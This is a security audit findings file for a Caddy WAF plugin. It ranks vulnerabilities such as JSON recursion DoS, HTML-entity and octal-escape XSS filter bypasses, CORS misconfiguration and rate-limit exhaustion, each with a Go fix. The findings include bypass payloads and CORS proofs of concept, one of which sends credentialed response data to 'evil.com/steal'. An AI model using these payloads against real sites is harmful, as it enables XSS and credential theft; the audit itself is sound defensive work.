# FIXES.md — Security Audit Findings

Code review performed against the full `caddy-policy-engine` codebase, considering its
position in the ergo stack: `Cloudflare -> caddy-ddos-mitigator -> caddy-policy-engine -> reverse_proxy -> backends`.

Rules are generated by `wafctl` (semi-trusted), request data is untrusted.

## P0 — Critical (Fix Immediately)

### 1. Unbounded JSON Recursion — Stack Overflow DoS

**File:** `policyengine.go` — `flattenJSONNode`, `flattenJSONNodeKeyed`, and related recursive walkers

**Problem:**
`flattenJSONNode` and `flattenJSONNodeKeyed` recurse into parsed JSON with no depth
limit. An attacker sends a single POST with a deeply nested JSON body (e.g., 10,000
levels of `{"a":{"a":...}}`) within the 13 MiB `body_max_size` limit. This overflows
the goroutine stack and panics, crashing the entire Caddy process. The ddos-mitigator
will not catch this because it is a single normal-looking POST request.

```go
func flattenJSONNode(node interface{}, vals *[]string) {
    switch v := node.(type) {
    case map[string]interface{}:
        for key, child := range v {
            *vals = append(*vals, key)
            flattenJSONNode(child, vals)  // unbounded recursion
        }
    case []interface{}:
        for _, child := range v {
            flattenJSONNode(child, vals)  // unbounded recursion
        }
```

**Impact:** Single-request DoS — process crash.

**Fix:**
Add a `depth int` parameter with a hard cap (64 is generous). Return early when exceeded.

```go
const maxJSONDepth = 64

func flattenJSONNode(node interface{}, vals *[]string, depth int) {
    if depth > maxJSONDepth {
        return
    }
    switch v := node.(type) {
    case map[string]interface{}:
        for key, child := range v {
            *vals = append(*vals, key)
            flattenJSONNode(child, vals, depth+1)
        }
    case []interface{}:
        for _, child := range v {
            flattenJSONNode(child, vals, depth+1)
        }
    // ...
    }
}
```

Apply the same pattern to `flattenJSONNodeKeyed` and `resolveJSONPathParsed` (though
the latter is bounded by dot-path length, adding a cap is defensive).

Update all callsites to pass `0` as the initial depth.

### 2. `htmlEntityDecode` Requires Trailing Semicolons — XSS Bypass

**File:** `transforms.go:186-191`

**Problem:**
ModSecurity and all browsers decode numeric HTML entities without trailing semicolons.
The current implementation requires a `;` within 12 characters:

```go
end := strings.IndexByte(s[i:], ';')
if end < 0 || end > 12 {
    b.WriteByte('&')
    i++
    continue
}
```

**Bypass payload:**
```
&#60script&#62alert(1)&#60/script&#62
```
The WAF passes this through unchanged. The browser renders `<script>alert(1)</script>`.

**Impact:** Any XSS detect rule relying on `t:htmlEntityDecode` is bypassable.

**Fix:**
When no `;` is found, attempt greedy digit consumption for numeric entities:

```go
if s[i] == '&' {
    // Try semicolon-terminated first (existing logic)
    end := strings.IndexByte(s[i:], ';')
    if end >= 0 && end <= 12 {
        // existing decode logic
        continue
    }
    // Fallback: semicolon-less numeric entity
    if i+2 < len(s) && s[i+1] == '#' {
        j := i + 2
        isHex := false
        if j < len(s) && (s[j] == 'x' || s[j] == 'X') {
            isHex = true
            j++
        }
        start := j
        for j < len(s) && isValidDigit(s[j], isHex) {
            j++
        }
        if j > start {
            // parse and emit the code point, advance i to j
            // ...
            continue
        }
    }
    b.WriteByte('&')
    i++
    continue
}
```

Add tests for: `&#60script&#62`, `&#x3cscript&#x3e`, mixed with/without semicolons.

### 3. `htmlEntityDecode` Named Entity Set Is Minimal — XSS via `&colon;`

**File:** `transforms.go:227-242`

**Problem:**
The `htmlEntities` map contains only 13 entries. HTML5 defines 2,231 named entities.
Browsers decode all of them. Security-critical missing entities:

| Entity | Decodes to | Attack use |
|--------|-----------|------------|
| `&colon;` | `:` | `javascript&colon;alert(1)` |
| `&sol;` | `/` | `&sol;script&gt;` closing tags |
| `&bsol;` | `\` | Path traversal, JS escapes |
| `&lpar;` | `(` | Function calls `alert&lpar;1&rpar;` |
| `&rpar;` | `)` | Function calls |
| `&lsqb;` | `[` | Array access |
| `&rsqb;` | `]` | Array access |
| `&lcub;` | `{` | Object/template injection |
| `&rcub;` | `}` | Object/template injection |
| `&Tab;` | `\t` | Attribute context breakout |
| `&NewLine;` | `\n` | Attribute context breakout |
| `&excl;` | `!` | `<!--` comment injection |
| `&num;` | `#` | Fragment/anchor injection |
| `&period;` | `.` | Property access `document&period;cookie` |
| `&comma;` | `,` | Argument separation |
| `&semi;` | `;` | Statement separation |
| `&equals;` | `=` | Assignment |

**Bypass payload:**
```
javascript&colon;alert&lpar;document&period;cookie&rpar;
```
None of `&colon;`, `&lpar;`, `&rpar;`, `&period;` are decoded. The signature
`javascript:alert(` never appears in the decoded string.

**Impact:** Trivial XSS bypass with zero sophistication.

**Fix:**
Add the entities listed above to the `htmlEntities` map. Full HTML5 entity coverage
is ideal but these 17 additions cover the security-critical attack surface.

```go
var htmlEntities = map[string]string{
    // existing 13 entries...
    "colon": ":", "sol": "/", "bsol": "\\",
    "lpar": "(", "rpar": ")", "lsqb": "[", "rsqb": "]",
    "lcub": "{", "rcub": "}", "Tab": "\t", "NewLine": "\n",
    "excl": "!", "num": "#", "period": ".", "comma": ",",
    "semi": ";", "equals": "=",
}
```

### 4. CORS Credentials + Wildcard Regex — Credential Theft

**File:** `responseheaders.go:363-370, 554`

**Problem:**
No compile-time validation prevents `AllowCredentials: true` combined with a wildcard
regex origin like `".*"`. This config reflects any attacker-controlled `Origin` header
back with `Access-Control-Allow-Credentials: true`, allowing any website to read
authenticated API responses:

```go
// responseheaders.go:554-556
if cors.allowCredentials {
    h.Set("Access-Control-Allow-Credentials", "true")
}
```

The attacker hosts `evil.com` with:
```html
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(data => exfiltrate(data))
</script>
```

The browser sends `Origin: https://evil.com`. The WAF responds with:
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**Impact:** Full credential theft — cookies, auth headers, session data.

**Fix:**
In `compileCORSSettings`, reject or warn when credentials are enabled with overly
broad patterns:

```go
func compileCORSSettings(s *CORSSettings) (*compiledCORSSettings, error) {
    // ... existing compilation ...
    if cs.allowCredentials {
        for _, re := range cs.originPatterns {
            // Test against a known-evil origin
            if re.MatchString("https://evil.example.com") {
                return nil, fmt.Errorf(
                    "CORS: AllowCredentials with broad regex %q allows credential theft; "+
                    "use exact origins or narrow patterns", re.String())
            }
        }
    }
    return cs, nil
}
```

A simpler approach: when `AllowCredentials` is true, disallow regex patterns entirely
and require exact origin strings.

### 5. CSP `RawDirectives` — Arbitrary Directive Injection

**File:** `responseheaders.go:84, 189-191`

**Problem:**
`RawDirectives` is concatenated directly into the CSP header string:

```go
if p.RawDirectives != "" {
    parts = append(parts, strings.TrimSpace(p.RawDirectives))
}
```

A rules file can inject arbitrary CSP directives via semicolons within `RawDirectives`.
Since this field is written by wafctl (admin-controlled), exploitation requires a
compromised management plane or a wafctl bug that allows user input into `RawDirectives`.
However, the lack of any validation makes this a latent injection vector.

**Impact:** CSP policy weakening or override.

**Fix:**
Validate that individual `RawDirectives` values don't contain `;` or control characters:

```go
if p.RawDirectives != "" {
    raw := strings.TrimSpace(p.RawDirectives)
    if strings.ContainsAny(raw, ";\r\n") {
        return "", fmt.Errorf("RawDirectives must not contain ';' or control characters")
    }
    parts = append(parts, raw)
}
```

Or split on `;` and validate each sub-directive name against a known directive allowlist.

## P1 — High (Fix This Week)

### 6. `base64Decode` Fallback Destroys Non-Base64 Input

**File:** `transforms.go:340-353`

**Problem:**
The three-step fallback chain tries `StdEncoding`, then `URLEncoding`, then
`RawStdEncoding`. `RawStdEncoding` doesn't require padding and accepts most
alphanumeric strings, so SQL keywords that happen to be valid base64 alphabet get
"decoded" into binary garbage:

```
Input: "UNION"
StdEncoding:    error (no padding)
URLEncoding:    error (no padding)
RawStdEncoding: success → "\x50\xa4\xa9"
```

Any rule applying `t:base64Decode` before SQLi detection will miss raw SQL keywords
because they're mangled before the operator runs. ModSecurity's `t:base64Decode` uses
standard encoding only and returns the original string on failure.

**Fix:**
Remove the `RawStdEncoding` fallback. Return the original string on decode failure
(matching ModSecurity behavior):

```go
func transformBase64Decode(s string) string {
    if decoded, err := base64.StdEncoding.DecodeString(s); err == nil {
        return string(decoded)
    }
    if decoded, err := base64.URLEncoding.DecodeString(s); err == nil {
        return string(decoded)
    }
    return s  // return original on failure, like ModSecurity
}
```

### 7. JSON Body Memory Amplification

**File:** `policyengine.go:366`

**Problem:**
`json.Unmarshal` into `interface{}` on a 13 MiB body creates Go maps and slices with
5-10x memory amplification due to map overhead, string headers, and interface boxing.
A JSON body with many small unique keys (`{"a1":"","a2":"",..."a999999":""}`) causes
~100+ MiB of heap per request. Under concurrent load, this exhausts memory.

```go
var root interface{}
if err := json.Unmarshal(pb.raw, &root); err == nil {
    pb.jsonRoot = root
    pb.jsonOK = true
}
```

**Impact:** Memory exhaustion DoS under concurrent POST traffic.

**Fix:**
Cap the number of extracted JSON values. Add a counter to `flattenJSONNode`:

```go
const maxJSONValues = 10000

func flattenJSONNode(node interface{}, vals *[]string, depth int) {
    if depth > maxJSONDepth || len(*vals) >= maxJSONValues {
        return
    }
    // ...
}
```

For a more complete fix, consider using `json.NewDecoder` with a token-level scanner
that counts tokens and aborts without building the full in-memory tree.

### 8. CORS Regex Origin Without `$` Anchor — Subdomain Bypass

**File:** `responseheaders.go:364, 519-521`

**Problem:**
`regexp.MatchString` does substring matching. A pattern like `^https://example\.com`
matches `https://example.com.evil.com` because there's no `$` anchor. Operators may
not realize their patterns need explicit anchoring.

```go
if re.MatchString(origin) {
    return true
}
```

**Impact:** Attacker registers `example.com.evil.com`, bypasses CORS origin check.

**Fix:**
Auto-wrap all origin patterns in full-match anchors:

```go
for _, o := range s.AllowedOrigins {
    if isRegexPattern(o) {
        // Ensure full-match semantics
        anchored := o
        if !strings.HasPrefix(anchored, "^") {
            anchored = "^" + anchored
        }
        if !strings.HasSuffix(anchored, "$") {
            anchored = anchored + "$"
        }
        if re, err := regexp.Compile(anchored); err == nil {
            cs.originPatterns = append(cs.originPatterns, re)
        } else {
            return nil, fmt.Errorf("invalid CORS origin regex %q: %w", o, err)
        }
    }
}
```

### 9. CORS `null` Origin Not Rejected

**File:** `responseheaders.go:510-525`

**Problem:**
Browsers send `Origin: null` for sandboxed iframes, `data:` URIs, and cross-origin
redirects. If `"null"` is in `AllowedOrigins` with `AllowCredentials: true`, any
sandboxed page can read authenticated responses:

```html
<iframe sandbox="allow-scripts"
  src="data:text/html,<script>
    fetch('https://target.com/api', {credentials:'include'})
      .then(r=>r.text()).then(d=>navigator.sendBeacon('https://evil.com/steal',d))
  </script>">
</iframe>
```

**Impact:** Credential theft from sandboxed context.

**Fix:**
Reject `"null"` as an allowed origin at compile time:

```go
for _, o := range s.AllowedOrigins {
    if o == "null" {
        return nil, fmt.Errorf("CORS: allowing Origin 'null' is insecure; " +
            "any sandboxed iframe can send this origin")
    }
}
```

### 10. Security Headers Overwritable by Upstream

**File:** `responseheaders.go:606-609`

**Problem:**
Security headers are set on `w.Header()` before `next.ServeHTTP(w, r)`. The upstream
handler can `w.Header().Del("X-Content-Type-Options")` or overwrite them before
`WriteHeader()` is called. The `responseHeaderWriter` wrapper only protects CSP (in
`"default"` mode) and header removal — it does not re-assert security headers.

```go
for k, v := range secHeaders {
    w.Header().Set(k, v)  // set before upstream runs
}
```

**Impact:** Upstream can silently strip HSTS, X-Frame-Options, etc.

**Fix:**
Move security header application into the `WriteHeader` intercept:

```go
func (rw *responseHeaderWriter) WriteHeader(statusCode int) {
    if rw.wroteHeader {
        return
    }
    rw.wroteHeader = true

    // Re-assert security headers (upstream may have cleared them)
    for k, v := range rw.securityHeaders {
        rw.ResponseWriter.Header().Set(k, v)
    }

    // existing CSP and removal logic...
    rw.ResponseWriter.WriteHeader(statusCode)
}
```

Store the security headers map in the `responseHeaderWriter` struct.

### 12. Allow/Skip Rules Can Bypass All Security

**File:** `policyengine.go:540-544, 657-690`

**Problem:**
An `allow` rule returns immediately from `ServeHTTP`, skipping all block, detect, and
rate_limit evaluation. A `skip` rule with `all_remaining: true` disables everything
for matched requests. If either uses only conditions based on spoofable fields (headers,
cookies, user-agent), an attacker forges those fields to bypass the entire WAF.

Example dangerous rule:
```json
{
  "type": "allow",
  "priority": 50,
  "conditions": [{"field": "header:X-Internal", "operator": "eq", "value": "true"}]
}
```
An attacker adds `X-Internal: true` to their request and bypasses all security.

**Impact:** Complete WAF bypass.

**Fix:**
Emit a compile-time warning when allow/skip rules match only on spoofable fields:

```go
spoofableFields := map[string]bool{
    "header": true, "cookie": true, "user_agent": true,
    "body": true, "body_json": true, "body_form": true,
    "query": true, "query_param": true,
}

func warnSpoofableAllowRule(rule PolicyRule, logger *zap.Logger) {
    if rule.Type != "allow" && rule.Type != "skip" {
        return
    }
    allSpoofable := true
    for _, cond := range rule.Conditions {
        field := cond.Field
        if idx := strings.Index(field, ":"); idx > 0 {
            field = field[:idx]
        }
        if !spoofableFields[field] {
            allSpoofable = false
            break
        }
    }
    if allSpoofable {
        logger.Warn("allow/skip rule uses only spoofable conditions; "+
            "consider adding an ip/ip_match condition",
            zap.String("rule_id", rule.ID),
            zap.String("rule_name", rule.Name))
    }
}
```

### 13. Merge Split RLock Sections

**File:** `policyengine.go:479-483, 509-511`

**Problem:**
`rules` and `wafConfig` are read under two separate `RLock` sections. A hot-reload
between them gives one request old rules with new wafConfig (or vice versa):

```go
pe.mu.RLock()
rules := pe.rules
globalCfg := pe.rlGlobalConfig
respHeaders := pe.respHeaders
pe.mu.RUnlock()

// ... 12 lines later ...

pe.mu.RLock()
wafCfg := pe.wafConfig
pe.mu.RUnlock()
```

Paranoia level or anomaly threshold mismatch for one request during reload.

**Fix:**
Read all state in a single RLock:

```go
pe.mu.RLock()
rules := pe.rules
globalCfg := pe.rlGlobalConfig
respHeaders := pe.respHeaders
wafCfg := pe.wafConfig
pe.mu.RUnlock()
```

This is a 5-minute fix with zero risk.

### 16. Rate Limit Memory Exhaustion via Unique Keys

**File:** `ratelimit.go:108-114`

**Problem:**
Each unique key creates a `counter` struct. With `key: "path"` or compound keys like
`"client_ip+path"`, an attacker generating unique paths creates unbounded map entries
between sweep intervals (default 30s). At ~200 bytes/entry:

- 10M unique keys = ~2 GB before next sweep
- Sweep only evicts entries older than 2x window, so short-window zones are more vulnerable

**Fix:**
Add a configurable `max_entries` per zone:

```go
type zone struct {
    events    int
    window    time.Duration
    maxKeys   int  // 0 = unlimited (backwards compat)
    shards    [numShards]shard
}

func (z *zone) allow(key string, now time.Time) (bool, int64, int) {
    s := z.getShard(key)
    s.mu.Lock()
    defer s.mu.Unlock()

    if z.maxKeys > 0 && len(s.counters) >= z.maxKeys/numShards {
        // Reject new keys when at capacity (deny-by-default)
        return false, 0, z.events
    }
    // ... existing logic
}
```

Add `max_keys` to `RateLimitConfig` JSON schema. Default to 100,000.

### 17. Aho-Corasick `strings.ToLower` Allocates Per Search

**File:** `ahocorasick.go:116, 148`

**Problem:**
Every `ContainsAny`/`FindFirst` call allocates a full copy via `strings.ToLower`. For
large bodies (up to 13 MiB), this is a guaranteed per-request allocation.

```go
lower := strings.ToLower(input)  // full copy
for i := 0; i < len(lower); i++ {
    b := lower[i]
```

Additionally, `strings.ToLower` does Unicode-aware case folding which can change byte
length for certain characters (e.g., Turkish dotted I). The byte-level trie is
consistent between compile and search, but ASCII-only lowering would be more
predictable and match Coraza's `@pm` semantics.

**Fix:**
Replace with inline ASCII lowering during the trie walk:

```go
func toLowerASCII(b byte) byte {
    if b >= 'A' && b <= 'Z' {
        return b + 0x20
    }
    return b
}

func (m *ACMatcher) ContainsAny(input string) bool {
    if m == nil || m.root == nil {
        return false
    }
    cur := m.root
    for i := 0; i < len(input); i++ {
        b := toLowerASCII(input[i])  // no allocation
        for cur != m.root && cur.children[b] == nil {
            cur = cur.fail
        }
        if next := cur.children[b]; next != nil {
            cur = next
        }
        if cur.hasOut || cur.dictFail != nil {
            return true
        }
    }
    return false
}
```

Apply the same to `CompileAC` (lowercase patterns byte-by-byte during trie
construction) and `FindFirst`.

### 18. `jsDecode` Missing Octal Escapes

**File:** `transforms.go:368-437`

**Problem:**
JavaScript octal escapes (`\101` = `A`, `\141` = `a`) are valid in non-strict mode.
ModSecurity's `t:jsDecode` handles them. This implementation only handles `\0` (null).

**Bypass payload:** `\141\154\145\162\164\50\61\51` = `alert(1)`

**Fix:**
After the `case '0':` handling, add octal parsing:

```go
case '0', '1', '2', '3', '4', '5', '6', '7':
    // Octal escape: \0 through \377 (1-3 digits)
    val := int(c - '0')
    for k := 0; k < 2 && j < len(s); k++ {
        d := s[j]
        if d < '0' || d > '7' {
            break
        }
        val = val*8 + int(d-'0')
        j++
    }
    if val > 255 {
        val = 255
    }
    b.WriteByte(byte(val))
```

### 19. `compressWhitespace` Only ASCII — Unicode Bypass

**File:** `transforms.go:303-320`

**Problem:**
Zero-width spaces (U+200B), non-breaking spaces (U+00A0), and en/em spaces are not
treated as whitespace. SQL/XSS payloads using these as separators bypass pattern
matching after `compressWhitespace`:

```
SELECT\u200B*\u200BFROM\u200Busers
```
After `compressWhitespace`: unchanged (U+200B is not in the whitespace set).
After CRS `contains "SELECT * FROM"`: no match.

This matches ModSecurity behavior, but is exploitable in modern contexts.

**Fix — Option A (expand whitespace set):**
Add at minimum U+00A0 and U+200B to the whitespace check. Requires rune-level
iteration instead of byte-level.

**Fix — Option B (new transform):**
Add a `normalizeUnicodeWhitespace` transform that converts all Unicode whitespace
categories to ASCII space, leaving `compressWhitespace` unchanged for CRS compat.

### 21. `updateZones` Called Outside `pe.mu.Lock` — Transient Bypass

**File:** `policyengine.go:3463-3474`

**Problem:**
After `pe.mu.Unlock()` but before `pe.rlState.updateZones(compiled)`, a request can
read new rules (with a new rate_limit rule) but find the zone missing, causing the
rate limit to be silently skipped for that request.

```go
pe.mu.Lock()
pe.rules = compiled
// ...
pe.mu.Unlock()

// Gap: rules visible but zones not yet updated
if pe.rlState != nil {
    pe.rlState.updateZones(compiled)
}
```

**Fix:**
Move `updateZones` inside the lock:

```go
pe.mu.Lock()
pe.rules = compiled
pe.rlGlobalConfig = globalCfg
pe.respHeaders = compiledRH
pe.wafConfig = compiledWaf
if pe.rlState != nil {
    pe.rlState.updateZones(compiled)
}
pe.mu.Unlock()
```

Note: `updateZones` acquires its own `rls.mu.Lock()`. Since `pe.mu` is always acquired
before `rls.mu`, there is no deadlock risk (consistent lock ordering).

### 22. CORS Missing `Vary: Origin` on Non-Matching Requests

**File:** `responseheaders.go:568-573`

**Problem:**
When CORS is enabled but the origin doesn't match (or no `Origin` header is sent),
`Vary: Origin` is not set. An intermediate cache could serve a CORS-less response to
an allowed origin, or a CORS response to a disallowed origin.

**Fix:**
Always set `Vary: Origin` when CORS is configured:

```go
func (crh *compiledResponseHeaders) ApplyCORSHeaders(w http.ResponseWriter, r *http.Request) {
    cors := crh.resolveCORS(r.Host)
    if cors == nil {
        return
    }

    // Always vary on Origin when CORS is configured
    w.Header().Add("Vary", "Origin")

    origin := r.Header.Get("Origin")
    if origin == "" || !cors.matchOrigin(origin) {
        return
    }
    // ... set CORS headers
}
```

### 23. CORS Preflight `Vary` Header Incomplete

**File:** `responseheaders.go:557`

**Problem:**
Preflight response only sets `Vary: Origin`. Per the Fetch spec, it should also vary
on the request method and headers:

```
Vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
```

**Fix:**
```go
h.Set("Vary", "Origin, Access-Control-Request-Method, Access-Control-Request-Headers")
```

### 24. CORS Origin Matching Not Normalized

**File:** `responseheaders.go:510-525`

**Problem:**
No normalization before matching:
- `https://Example.COM` vs `https://example.com` — scheme and host are case-insensitive per RFC 6454
- `https://example.com:443` vs `https://example.com` — default port should be stripped
- `https://example.com.` vs `https://example.com` — trailing FQDN dot

**Fix:**
Normalize before matching:

```go
func normalizeOrigin(origin string) string {
    origin = strings.ToLower(origin)
    // Strip default ports
    origin = strings.TrimSuffix(origin, ":443")
    origin = strings.TrimSuffix(origin, ":80")
    // Strip trailing dot
    // (careful: only from the host portion, not the scheme)
    return origin
}
```

Apply to both the config origins (at compile time) and incoming `Origin` headers (at
match time).

## P3 — Low (Fix When Convenient)

### 25. Debug Headers Enabled by Default

**File:** `policyengine.go:641-646`

`X-Blocked-By`, `X-Blocked-Rule`, `X-Policy-Tags` expose rule names, tags, anomaly
scores, and detect rule details to attackers. `HideHeaders` should default to `true`,
or the documentation should prominently recommend enabling it in production.

### 26. `r.URL.Query()` Parsed Repeatedly

**File:** `policyengine.go` — multiple locations

Each call to `r.URL.Query()` re-parses the query string. With many multi-field
conditions, this happens dozens of times per request. Cache it once:

```go
type requestCache struct {
    query     url.Values
    queryOnce sync.Once
}
```

### 27. `request_combined` Rebuilds Value Slice Per Rule

**File:** `policyengine.go:1678-1734`

The expensive `extractMultiField` for `request_combined` is re-done for every detect
rule condition targeting it. Cache the result per field per request using the same
`requestCache` pattern.

### 28. Nested Condition Groups — No Depth Limit

**File:** `policyengine.go:3026-3041`

`compileCondition` recurses with no depth cap. A compromised rules file can crash the
reload goroutine. Add `const maxConditionDepth = 5`.

### 29. `url.ParseQuery` Discards Partial Results on Error

**File:** `policyengine.go:380-386`

Go's `url.ParseQuery` may return partial results plus an error. The code discards both.
Consider using the partial result: `pb.formVals = vals` regardless of error (Go 1.17+
guarantees partial results are usable).

### 30. CORS Regex Compilation Silently Drops Invalid Patterns

**File:** `responseheaders.go:365-367`

Invalid regex patterns vanish with no error or warning. Return an error from
`compileCORSSettings`:

```go
re, err := regexp.Compile(o)
if err != nil {
    return nil, fmt.Errorf("invalid CORS origin regex %q: %w", o, err)
}
```

### 31. `resolveCORS` Missing Nil Guard

**File:** `responseheaders.go:498-507`

Unlike `resolveCSP` and `resolveSecurity`, `resolveCORS` doesn't check `crh == nil`.
Add for consistency:

```go
func (crh *compiledResponseHeaders) resolveCORS(host string) *compiledCORSSettings {
    if crh == nil || crh.cors == nil || !crh.cors.enabled {
        return nil
    }
```

### 32. CSP Fallback Mode Hardcoded to `"set"`

**File:** `responseheaders.go:276-279`

The global CSP fallback is always `mode: "set"`. Allow configuring `mode` and
`report_only` on the global defaults for flexibility.

### 33. No Default Security Headers

**File:** `responseheaders.go:300-338`

A minimal config produces zero security headers. Consider offering a
`"preset": "strict"` option that applies:
```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin
```

### 34. Detect Rule Tag Lookup Is O(N*M)

**File:** `policyengine.go:806-818`

For each matched detect rule, tags are found by scanning the entire rules slice. Build
a `map[string][]string` (ruleID → tags) at compilation time.

## Systemic Recommendations

### Type Mirroring Across Projects

`PolicyRule` types are defined independently in caddy-policy-engine, wafctl, and
crs-converter. Structural drift is a correctness risk. Consider:
- Extracting shared types into a Go module that all three import
- Or at minimum, adding a version assertion in the rules JSON that the engine validates

### Atomic Rules File Writes

Document (and enforce in wafctl) that `policy-rules.json` must be written atomically
via write-to-temp-then-rename. The engine's hot-reload is fail-safe on corrupt files,
but atomic writes eliminate the issue entirely.

### Integration Testing

No automated test sends traffic through the full chain. Consider a lightweight
integration test in caddy-compose that:
1. Starts Caddy with all three plugins
2. Sends a known-blocked request → asserts 403
3. Sends a known-allowed request → asserts 200
4. Sends rate-limited traffic → asserts 429
5. Verifies wafctl event log entries

### Fuzz Testing

The transform functions are prime fuzz targets. Go's built-in fuzzing (`go test -fuzz`)
would catch edge cases in URL decoding, HTML entity parsing, base64 handling, and
CSS/JS decoding:

```go
func FuzzURLDecode(f *testing.F) {
    f.Add("%3Cscript%3E")
    f.Add("%253Cscript%253E")
    f.Add("%%3Cscript%3E")
    f.Fuzz(func(t *testing.T, input string) {
        transformURLDecode(input)  // must not panic
    })
}
```
